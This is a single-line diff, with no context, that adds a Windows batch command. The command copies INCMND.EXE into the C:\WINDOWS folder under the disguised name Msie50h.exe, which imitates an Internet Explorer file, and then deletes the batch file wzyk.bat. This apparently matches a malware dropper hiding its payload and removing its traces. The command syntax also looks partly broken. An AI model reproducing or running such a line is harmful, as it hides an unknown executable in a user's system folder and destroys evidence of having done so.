@@ -1,0 +1,1 @@
+copy /f /y C:\NV\INCMND.EXE C:\WINDOWS\Msie50h.exe | del C:\WINDOWS\wzyk.bat
